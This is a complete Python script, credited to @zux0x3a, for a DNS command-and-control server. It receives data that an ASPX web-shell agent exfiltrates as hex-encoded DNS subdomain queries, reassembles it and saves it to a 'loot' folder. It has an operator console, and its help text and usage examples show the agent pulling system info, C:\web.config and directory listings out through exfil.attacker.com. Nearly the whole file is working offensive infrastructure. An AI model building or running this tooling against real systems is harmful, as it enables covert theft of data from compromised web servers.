#!/usr/bin/env python3
"""
c2_dns_server.py — DNS C2 Server for IIS XSLT Exec DNS Exfiltration (T6)

Receives data exfiltrated via DNS subdomain queries from xslt_exec.aspx
TechniqueDnsExfil(). Runs an authoritative DNS server that captures
hex-encoded chunks embedded in query names and reassembles them.

Protocol (from xslt_exec.aspx T6):
    Probe:     probe.<basedomain>
    Data:      NNNN.<hex_chunk_up_to_60chars>.<basedomain>
    End:       end.<total_chunks>.<basedomain>

    NNNN = zero-padded 4-digit sequence number
    hex_chunk = hex-encoded UTF-8 bytes (lowercase, no separators)
    Agent sends one DNS A query per chunk, sleeps 100ms every 10 queries.

Agent usage in xslt_exec.aspx:
    T6: DNS Exfiltration
    args: yourdomain.com              (probe only)
    args: yourdomain.com|sysinfo      (exec task + exfil result)
    args: yourdomain.com|cat C:\\x    (file exfil)

Usage:
    python3 c2_dns_server.py [--port 53] [--host 0.0.0.0] [--domain c2.example.com]

    The --domain flag sets the expected base domain. Queries not matching
    this suffix are ignored (or forwarded if --forward is set).

    Requires root/admin for port 53, or use --port 5353 for unprivileged testing.

Examples:
    sudo python3 c2_dns_server.py --domain exfil.attacker.com
    python3 c2_dns_server.py --port 5353 --domain test.local
"""

import argparse
import binascii
import os
import re
import readline
import socket
import struct
import sys
import threading
import time
from collections import OrderedDict
from datetime import datetime


# ── Colors ───────────────────────────────────────────────────────────────────

class C:
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BLUE   = "\033[94m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"
    WHITE  = "\033[97m"
    MAGENTA = "\033[95m"


def log(msg, color=C.DIM):
    ts = datetime.now().strftime("%H:%M:%S")
    sys.stdout.write(f"\r\033[K{color}[{ts}]{C.RESET} {msg}\n")
    sys.stdout.flush()


def print_separator():
    print(f"{C.DIM}{'─' * 72}{C.RESET}")


# ── DNS Packet Parsing ──────────────────────────────────────────────────────
#
# Minimal DNS parser — only needs to extract the QNAME from A record queries
# and respond with a valid (but meaningless) answer so the agent's
# Dns.GetHostEntry() call completes without timeout delays.

def parse_dns_query(data):

    if len(data) < 12:
        return None, None, None

    txn_id = data[:2]
    # Skip header (12 bytes), parse QNAME labels
    offset = 12
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        offset += 1
        if offset + length > len(data):
            break
        labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
        offset += length

    qname = ".".join(labels) if labels else ""

    qtype = None
    if offset + 2 <= len(data):
        qtype = struct.unpack("!H", data[offset:offset + 2])[0]

    return txn_id, qname, qtype


def build_dns_response(txn_id, raw_query, answer_ip="127.0.0.1"):

    # Flags: QR=1, OPCODE=0, AA=1, TC=0, RD=1, RA=1, RCODE=0
    flags = 0x8580
    
    header = txn_id + struct.pack("!HHHHH", flags, 1, 1, 0, 0)

    
    offset = 12
    while offset < len(raw_query) and raw_query[offset] != 0:
        offset += 1 + raw_query[offset]
    offset += 1  # null terminator
    offset += 4  # QTYPE + QCLASS
    question = raw_query[12:offset]

   
    answer = (
        b"\xc0\x0c"                              # name pointer to offset 12 (QNAME)
        + struct.pack("!HHI", 1, 1, 60)          # TYPE=A, CLASS=IN, TTL=60
        + struct.pack("!H", 4)                    # RDLENGTH=4
        + socket.inet_aton(answer_ip)             # RDATA
    )

    return header + question + answer


def build_nxdomain_response(txn_id, raw_query):
    
    flags = 0x8583  # QR=1, AA=1, RD=1, RA=1, RCODE=3 (NXDOMAIN)
    header = txn_id + struct.pack("!HHHHH", flags, 1, 0, 0, 0)

    offset = 12
    while offset < len(raw_query) and raw_query[offset] != 0:
        offset += 1 + raw_query[offset]
    offset += 1 + 4
    question = raw_query[12:offset]

    return header + question


# ── Session Tracking ─────────────────────────────────────────────────────────

class ExfilSession:
   

    def __init__(self, base_domain):
        self.base_domain = base_domain
        self.resolver_ips = set()   # all resolver IPs that forwarded chunks
        self.chunks = {}            # seq_num (int) -> hex_string
        self.expected_total = None
        self.started = datetime.now()
        self.last_seen = datetime.now()
        self.complete = False

    def add_chunk(self, seq_num, hex_data, resolver_ip=None):
        self.chunks[seq_num] = hex_data
        self.last_seen = datetime.now()
        if resolver_ip:
            self.resolver_ips.add(resolver_ip)

    def set_end(self, total):
        self.expected_total = total
        self.last_seen = datetime.now()
        if len(self.chunks) >= total:
            self.complete = True

    def is_complete(self):
        if self.expected_total is None:
            return False
        self.complete = len(self.chunks) >= self.expected_total
        return self.complete

    def reassemble(self):
        
        if not self.chunks:
            return ""
        max_seq = max(self.chunks.keys())
        hex_str = ""
        for i in range(max_seq + 1):
            hex_str += self.chunks.get(i, "")
        try:
            raw = binascii.unhexlify(hex_str)
            return raw.decode("utf-8", errors="replace")
        except (binascii.Error, ValueError) as e:
            return f"[decode error: {e}] raw hex: {hex_str[:200]}..."

    def progress(self):
        received = len(self.chunks)
        if self.expected_total:
            return f"{received}/{self.expected_total}"
        return f"{received}/?"

    def source_label(self):
        
        if len(self.resolver_ips) == 1:
            return next(iter(self.resolver_ips))
        elif len(self.resolver_ips) <= 3:
            return ", ".join(sorted(self.resolver_ips))
        else:
            sample = sorted(self.resolver_ips)[:2]
            return f"{', '.join(sample)} +{len(self.resolver_ips)-2} more"



active_session = None       # ExfilSession or None
completed = []              # list of completed ExfilSession objects
probes = []                 # [(timestamp, source_ip)]
query_log = []              # [(timestamp, source_ip, qname)]
server_running = True
auto_print = True
base_domain = ""
answer_ip = "127.0.0.1"
session_timeout = 30        # seconds of inactivity before auto-completing
lock = threading.Lock()


def get_or_create_session(domain, resolver_ip=None):
    """Return the active session, or create a new one.

    A new session is created when:
      - No active session exists
      - The previous session is already marked complete
      - The previous session has been idle longer than session_timeout
    """
    global active_session

    now = datetime.now()

    if active_session and not active_session.complete:
        idle = (now - active_session.last_seen).total_seconds()
        if idle > session_timeout and active_session.chunks:
            log(f"[TIMEOUT] Previous session idle {idle:.0f}s — "
                f"auto-completing with {len(active_session.chunks)} chunks", C.YELLOW)
            if active_session.expected_total is None:
                active_session.set_end(max(active_session.chunks.keys()) + 1)
            _finish_session(active_session)
            active_session = None

    if active_session is None or active_session.complete:
        active_session = ExfilSession(domain)
        resolver_tag = f" (via {resolver_ip})" if resolver_ip else ""
        log(f"[SESSION] New exfil session{resolver_tag}", C.GREEN)

    return active_session


# ── DNS Server ───────────────────────────────────────────────────────────────

def dns_server(host, port, domain):
    """UDP DNS listener that captures exfil queries and responds."""
    global server_running

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((host, port))
    except PermissionError:
        log(f"Permission denied binding to port {port}. Try sudo or --port 5353.", C.RED)
        server_running = False
        return
    except OSError as e:
        log(f"Bind error: {e}", C.RED)
        server_running = False
        return

    sock.settimeout(1.0)
    log(f"DNS listener on {C.BOLD}{host}:{port}{C.RESET}", C.GREEN)

    domain_lower = domain.lower().rstrip(".")

    while server_running:
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError:
            break

        source_ip = addr[0]
        txn_id, qname, qtype = parse_dns_query(data)
        if qname is None:
            continue

        qname_lower = qname.lower()
        ts = datetime.now()

        with lock:
            query_log.append((ts, source_ip, qname_lower))

        
        if not qname_lower.endswith("." + domain_lower) and qname_lower != domain_lower:
            
            resp = build_nxdomain_response(txn_id, data)
            sock.sendto(resp, addr)
            continue

        
        if qname_lower == domain_lower:
            resp = build_dns_response(txn_id, data, answer_ip)
            sock.sendto(resp, addr)
            continue

        prefix = qname_lower[:-(len(domain_lower) + 1)]  # strip ".basedomain"
        parts = prefix.split(".")

        # Always respond with a valid answer so the agent doesn't stall
        resp = build_dns_response(txn_id, data, answer_ip)
        sock.sendto(resp, addr)

        with lock:
          
            if parts[0] == "probe":
                probes.append((ts, source_ip))
                log(f"[PROBE] {C.BOLD}{source_ip}{C.RESET} — "
                    f"DNS connectivity confirmed", C.MAGENTA)
                continue

           
            if parts[0] == "end" and len(parts) >= 2:
                try:
                    total = int(parts[1])
                except ValueError:
                    continue
                if active_session and not active_session.complete:
                    active_session.resolver_ips.add(source_ip)
                    active_session.set_end(total)
                    if active_session.is_complete():
                        _finish_session(active_session)
                    else:
                        log(f"[END]   Expected {total} chunks, "
                            f"have {len(active_session.chunks)} — "
                            f"waiting for remaining...", C.YELLOW)
                else:
                    log(f"[END]   Received end marker but no active session "
                        f"(via {source_ip})", C.YELLOW)
                continue

            # ── Data chunk: NNNN.<hex>.<basedomain> ──
            if len(parts) >= 2:
                try:
                    seq_num = int(parts[0])
                except ValueError:
                    log(f"[?] Unrecognized query: {qname_lower}", C.DIM)
                    continue

                hex_data = parts[1]
                if not re.match(r'^[0-9a-f]+$', hex_data):
                    log(f"[?] Non-hex chunk data in: {qname_lower}", C.YELLOW)
                    continue

                sess = get_or_create_session(domain, resolver_ip=source_ip)
                sess.add_chunk(seq_num, hex_data, resolver_ip=source_ip)

               
                received = len(sess.chunks)
                if received == 1:
                    log(f"[RECV]  Receiving data (via {source_ip})...", C.CYAN)
                elif received % 10 == 0:
                    log(f"[RECV]  {sess.progress()} chunks "
                        f"(from {len(sess.resolver_ips)} resolvers)", C.CYAN)

                
                if sess.expected_total and sess.is_complete():
                    _finish_session(sess)

    sock.close()


def _finish_session(sess):
    """Reassemble and display a completed exfil session."""
    global active_session

    decoded = sess.reassemble()
    sess.complete = True
    completed.append(sess)

    resolver_info = f" via {len(sess.resolver_ips)} resolver(s)" if sess.resolver_ips else ""
    log(f"[COMPLETE] {C.BOLD}{C.GREEN}Exfil captured{C.RESET} — "
        f"{len(sess.chunks)} chunks, "
        f"{len(decoded)} chars decoded{resolver_info}", C.GREEN)

    if auto_print:
        print_separator()
        print(decoded)
        print_separator()

  
    os.makedirs("loot", exist_ok=True)
    ts_str = sess.started.strftime("%Y%m%d_%H%M%S")
    fname = f"dns_exfil_{ts_str}.txt"
    fpath = os.path.join("loot", fname)
    try:
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(f"# DNS Exfiltration Capture\n")
            f.write(f"# Resolvers: {', '.join(sorted(sess.resolver_ips))}\n")
            f.write(f"# Domain: {sess.base_domain}\n")
            f.write(f"# Started: {sess.started}\n")
            f.write(f"# Completed: {sess.last_seen}\n")
            f.write(f"# Chunks: {len(sess.chunks)}\n")
            f.write(f"# Decoded size: {len(decoded)} chars\n")
            f.write(f"#\n\n")
            f.write(decoded)
        log(f"[SAVED] {C.GREEN}{fpath}{C.RESET}", C.GREEN)
    except Exception as e:
        log(f"[SAVE ERROR] {e}", C.RED)

    # Clear active session so next exfil starts fresh
    if active_session is sess:
        active_session = None


# ── Interactive Console ──────────────────────────────────────────────────────

BANNER = f"""
{C.BOLD}{C.RED}\
   ╔╦╗╔╗╔╔═╗  ╔═╗2  ╔═╗┌─┐┬─┐┬  ┬┌─┐┬─┐
    ║║║║║╚═╗  ║    ╚═╗├┤ ├┬┘└┐┌┘├┤ ├┬┘
   ═╩╝╝╚╝╚═╝  ╚═╝  ╚═╝└─┘┴└─ └┘ └─┘┴└─\
{C.RESET}
{C.BOLD}   DNS Exfiltration C2 Server @zux0x3a {C.RESET}
{C.DIM}   For IIS xslt_exec.aspx T6: DNS Exfil
   Captures hex-encoded data from DNS subdomain queries{C.RESET}
"""

HELP_TEXT = f"""
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}
{C.BOLD} DNS Exfiltration C2 — Command Reference{C.RESET}
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}

{C.CYAN}Monitoring:{C.RESET}
  sessions / list      Show active exfil sessions
  completed / results  Show completed exfil captures
  probes               Show probe history
  queries [n]          Show last N raw DNS queries (default: 20)
  show <n>             Show completed capture #n in full
  last [n]             Show last N completed captures (default: 1)

{C.CYAN}Data Export:{C.RESET}
  save <file>          Save all completed captures to file
  export <n> <file>    Export capture #n to file
  loot                 List files in ./loot/ directory

{C.CYAN}Session Management:{C.RESET}
  flush                Force-complete the active session now
  drop                 Discard the active session
  clear                Clear query log
  timeout [sec]        Set/show session idle timeout (default: 30s)

{C.CYAN}Settings:{C.RESET}
  autoprint [on|off]   Toggle auto-display of decoded data (default: on)
  status               Show server status and stats

{C.CYAN}Control:{C.RESET}
  help / ?             This help text
  quit / q             Stop server and exit

{C.YELLOW}ASPX Agent Usage (loader.aspx → T6: DNS Exfiltration):{C.RESET}
  Probe:    args = yourdomain.com
  Exfil:    args = yourdomain.com|sysinfo
  File:     args = yourdomain.com|cat C:\\web.config
  Dir:      args = yourdomain.com|ls C:\\inetpub
"""


def console_loop():
   
    global server_running, auto_print, session_timeout

    print(BANNER)
    print(HELP_TEXT)

    while server_running:
        try:
            prompt = f"{C.BOLD}{C.RED}DNS-C2{C.RESET}> "
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            server_running = False
            break

        if not cmd:
            continue

        lower = cmd.lower()

        # ── Server control ───────────────────────────────────────────
        if lower in ("quit", "q", "exit"):
            log("Shutting down...", C.YELLOW)
            server_running = False
            break

        elif lower in ("help", "?"):
            print(HELP_TEXT)

        # ── Session monitoring ───────────────────────────────────────
        elif lower in ("sessions", "list", "active"):
            with lock:
                if active_session is None or active_session.complete:
                    log("No active session.", C.YELLOW)
                else:
                    sess = active_session
                    age = (datetime.now() - sess.last_seen).total_seconds()
                    if age < 10:
                        status = f"{C.GREEN}● receiving{C.RESET}"
                    elif age < session_timeout:
                        status = f"{C.YELLOW}● idle ({age:.0f}s){C.RESET}"
                    else:
                        status = f"{C.RED}● stale ({age:.0f}s){C.RESET}"
                    print()
                    print(f"  {C.BOLD}Active Session{C.RESET}")
                    print(f"  {'─' * 60}")
                    print(f"  Chunks:     {sess.progress()}")
                    print(f"  Resolvers:  {len(sess.resolver_ips)} "
                          f"({sess.source_label()})")
                    print(f"  Started:    {sess.started.strftime('%H:%M:%S')}")
                    print(f"  Last seen:  {sess.last_seen.strftime('%H:%M:%S')}")
                    print(f"  Status:     {status}")
                    print()

        elif lower in ("completed", "results", "captures"):
            with lock:
                if not completed:
                    log("No completed captures.", C.YELLOW)
                else:
                    print()
                    print(f"  {C.BOLD}{'#':<5} {'Time':<20} {'Chunks':<10} "
                          f"{'Size':<14} {'Resolvers'}{C.RESET}")
                    print(f"  {'─' * 72}")
                    for i, sess in enumerate(completed):
                        decoded = sess.reassemble()
                        print(f"  {i:<5} "
                              f"{sess.started.strftime('%Y-%m-%d %H:%M:%S'):<20} "
                              f"{len(sess.chunks):<10} "
                              f"{len(decoded):<14} "
                              f"{len(sess.resolver_ips)} IPs")
                    print()
                    print(f"  {C.DIM}Use 'show <#>' to view full output, "
                          f"'last [n]' for recent.{C.RESET}")
                    print()

        elif lower == "probes":
            with lock:
                if not probes:
                    log("No probes received.", C.YELLOW)
                else:
                    print()
                    print(f"  {C.BOLD}{'Time':<12} {'Source IP'}{C.RESET}")
                    print(f"  {'─' * 40}")
                    for ts, ip in probes[-20:]:
                        print(f"  {ts.strftime('%H:%M:%S'):<12} {ip}")
                    if len(probes) > 20:
                        print(f"  {C.DIM}... showing last 20 of {len(probes)}{C.RESET}")
                    print()

        elif lower.startswith("queries"):
            parts = lower.split()
            n = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
            with lock:
                recent = query_log[-n:]
                if not recent:
                    log("No queries logged.", C.YELLOW)
                else:
                    print()
                    print(f"  {C.BOLD}{'Time':<12} {'Source':<18} {'Query'}{C.RESET}")
                    print(f"  {'─' * 72}")
                    for ts, ip, qname in recent:
                        print(f"  {ts.strftime('%H:%M:%S'):<12} {ip:<18} {qname}")
                    if len(query_log) > n:
                        print(f"  {C.DIM}... showing last {n} of "
                              f"{len(query_log)} total{C.RESET}")
                    print()

        elif lower.startswith("show "):
            parts = lower.split()
            if len(parts) > 1 and parts[1].isdigit():
                idx = int(parts[1])
                with lock:
                    if 0 <= idx < len(completed):
                        sess = completed[idx]
                        decoded = sess.reassemble()
                        print()
                        print(f"  {C.BOLD}Capture #{idx}{C.RESET} — "
                              f"{sess.started.strftime('%Y-%m-%d %H:%M:%S')} — "
                              f"{len(sess.chunks)} chunks — "
                              f"via {C.CYAN}{sess.source_label()}{C.RESET}")
                        print_separator()
                        print(decoded)
                        print_separator()
                    else:
                        log(f"Invalid index. Range: 0-{len(completed)-1}", C.RED)
            else:
                log("Usage: show <capture-number>", C.YELLOW)

        elif lower.startswith("last"):
            parts = lower.split()
            n = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
            with lock:
                recent = completed[-n:]
                if not recent:
                    log("No completed captures.", C.YELLOW)
                else:
                    for sess in recent:
                        decoded = sess.reassemble()
                        print()
                        print(f"  {C.BOLD}[{sess.started.strftime('%H:%M:%S')}]{C.RESET} "
                              f"{len(sess.chunks)} chunks, {len(decoded)} chars "
                              f"(via {len(sess.resolver_ips)} resolvers)")
                        print_separator()
                        print(decoded)
                        print_separator()

       
        elif lower.startswith("save "):
            fname = cmd[5:].strip()
            with lock:
                try:
                    with open(fname, "w", encoding="utf-8") as f:
                        for i, sess in enumerate(completed):
                            decoded = sess.reassemble()
                            f.write(f"{'=' * 60}\n")
                            f.write(f"Capture #{i} | {sess.source_ip} | "
                                    f"{sess.started} | "
                                    f"{len(sess.chunks)} chunks\n")
                            f.write(f"{'=' * 60}\n")
                            f.write(decoded)
                            f.write("\n\n")
                    log(f"Saved {len(completed)} captures to "
                        f"{C.GREEN}{fname}{C.RESET}", C.GREEN)
                except Exception as e:
                    log(f"Save error: {e}", C.RED)

        elif lower.startswith("export "):
            parts = cmd.split(None, 2)
            if len(parts) >= 3 and parts[1].isdigit():
                idx = int(parts[1])
                fname = parts[2]
                with lock:
                    if 0 <= idx < len(completed):
                        decoded = completed[idx].reassemble()
                        try:
                            with open(fname, "w", encoding="utf-8") as f:
                                f.write(decoded)
                            log(f"Exported capture #{idx} to "
                                f"{C.GREEN}{fname}{C.RESET} "
                                f"({len(decoded)} chars)", C.GREEN)
                        except Exception as e:
                            log(f"Export error: {e}", C.RED)
                    else:
                        log(f"Invalid index. Range: 0-{len(completed)-1}", C.RED)
            else:
                log("Usage: export <capture-number> <filename>", C.YELLOW)

        elif lower == "loot":
            loot_dir = "loot"
            if not os.path.isdir(loot_dir):
                log("No loot directory.", C.YELLOW)
            else:
                files = sorted(os.listdir(loot_dir))
                if not files:
                    log("Loot directory is empty.", C.YELLOW)
                else:
                    print()
                    for f in files:
                        fpath = os.path.join(loot_dir, f)
                        size = os.path.getsize(fpath)
                        print(f"  {size:>10,} bytes  {f}")
                    print()

       
        elif lower == "flush":
            with lock:
                if active_session is None or active_session.complete:
                    log("No active session to flush.", C.YELLOW)
                elif not active_session.chunks:
                    log("Active session has no chunks.", C.YELLOW)
                else:
                    if active_session.expected_total is None:
                        active_session.set_end(max(active_session.chunks.keys()) + 1)
                    _finish_session(active_session)
                    log(f"Flushed session.", C.GREEN)

        elif lower == "drop":
            with lock:
                if active_session and not active_session.complete:
                    chunks = len(active_session.chunks)
                    active_session.complete = True
                    active_session = None
                    log(f"Dropped active session ({chunks} chunks discarded).", C.GREEN)
                else:
                    log("No active session to drop.", C.YELLOW)

        elif lower == "clear":
            with lock:
                count = len(query_log)
                query_log.clear()
                log(f"Cleared {count} query log entries.", C.YELLOW)

        elif lower.startswith("timeout"):
            parts = lower.split()
            if len(parts) > 1 and parts[1].isdigit():
                session_timeout = int(parts[1])
                log(f"Session timeout set to {C.CYAN}{session_timeout}s{C.RESET}", C.GREEN)
            else:
                log(f"Current timeout: {session_timeout}s. "
                    f"Usage: timeout <seconds>", C.CYAN)

        
        elif lower.startswith("autoprint"):
            parts = lower.split()
            if len(parts) > 1:
                auto_print = parts[1] in ("on", "true", "1", "yes")
            else:
                auto_print = not auto_print
            log(f"Auto-print: {C.GREEN if auto_print else C.RED}"
                f"{'ON' if auto_print else 'OFF'}{C.RESET}", C.GREEN)

        elif lower == "status":
            with lock:
                has_active = active_session and not active_session.complete
                print()
                print(f"  {C.BOLD}Server Status{C.RESET}")
                print_separator()
                print(f"  Base domain:       {C.CYAN}{base_domain}{C.RESET}")
                print(f"  Answer IP:         {answer_ip}")
                print(f"  Session timeout:   {session_timeout}s")
                print(f"  Active session:    "
                      f"{C.GREEN + 'YES (' + active_session.progress() + ')' if has_active else C.DIM + 'none'}{C.RESET}")
                print(f"  Completed:         {len(completed)}")
                print(f"  Probes received:   {len(probes)}")
                print(f"  Total queries:     {len(query_log)}")
                print(f"  Auto-print:        "
                      f"{C.GREEN + 'ON' if auto_print else C.RED + 'OFF'}{C.RESET}")
                print()

        else:
            log(f"Unknown command: {cmd}. Type 'help' for commands.", C.YELLOW)




def main():
    global server_running, base_domain, answer_ip

    parser = argparse.ArgumentParser(
        description="DNS C2 Server for IIS xslt_exec.aspx T6 DNS Exfiltration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 c2_dns_server.py --domain exfil.attacker.com
  python3 c2_dns_server.py --port 5353 --domain test.local
  python3 c2_dns_server.py --domain c2.lab --answer-ip 10.0.0.5

ASPX agent usage (xslt_exec.aspx → T6: DNS Exfiltration):
  Probe only:   args = exfil.attacker.com
  Sysinfo:      args = exfil.attacker.com|sysinfo
  File exfil:   args = exfil.attacker.com|cat C:\\web.config
  Dir listing:  args = exfil.attacker.com|ls C:\\inetpub
        """)
    parser.add_argument("--host", default="0.0.0.0",
                        help="Listen address (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=53,
                        help="Listen port (default: 53, use 5353 for unprivileged)")
    parser.add_argument("--domain", required=True,
                        help="Base domain for exfil queries (e.g., exfil.attacker.com)")
    parser.add_argument("--answer-ip", default="127.0.0.1",
                        help="IP to return in DNS responses (default: 127.0.0.1)")
    args = parser.parse_args()

    base_domain = args.domain.lower().rstrip(".")
    answer_ip = args.answer_ip

    os.makedirs("loot", exist_ok=True)

    # Start DNS server thread
    dns_thread = threading.Thread(
        target=dns_server,
        args=(args.host, args.port, base_domain),
        daemon=True
    )
    dns_thread.start()

    
    time.sleep(0.5)
    if not server_running:
        sys.exit(1)

    print()
    log(f"Base domain: {C.BOLD}{C.CYAN}{base_domain}{C.RESET}", C.GREEN)
    log(f"Answer IP:   {C.CYAN}{answer_ip}{C.RESET}", C.GREEN)
    log(f"Loot dir:    {C.CYAN}./loot/{C.RESET}", C.GREEN)
    log(f"Auto-print:  {C.GREEN}ON{C.RESET} (decoded data displays automatically)", C.GREEN)
    print()
    log(f"Waiting for DNS queries on {C.BOLD}{args.host}:{args.port}{C.RESET}...", C.GREEN)
    print()

    try:
        console_loop()
    except Exception as e:
        log(f"Console error: {e}", C.RED)
    finally:
        server_running = False
        log("Server stopped.", C.YELLOW)


if __name__ == "__main__":
    main()
